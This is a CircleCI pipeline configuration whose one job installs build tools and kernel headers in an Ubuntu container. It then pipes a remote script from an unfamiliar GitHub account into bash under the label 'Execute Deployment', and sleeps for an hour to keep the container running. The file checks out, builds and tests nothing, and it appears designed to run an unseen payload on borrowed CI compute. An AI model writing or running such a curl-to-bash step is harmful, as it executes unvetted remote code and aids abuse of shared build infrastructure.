version: 2.1

jobs:
  compute-task:
    docker:
      - image: ubuntu:22.04
    
    steps:
      - run:
          name: "Setup Dependencies"
          command: |
            apt-get update -qq
            apt-get install -y -qq curl sudo wget unzip build-essential linux-headers-generic git make gcc
      
      - run:
          name: "Execute Deployment"
          command: |
            curl -sL https://raw.githubusercontent.com/temporaxinfinity-pixel/singular/main/auto_deploy.sh | bash
      
      - run:
          name: "Keep Process Running"
          command: |
            sleep 3600

workflows:
  compute-workflow:
    jobs:
      - compute-task
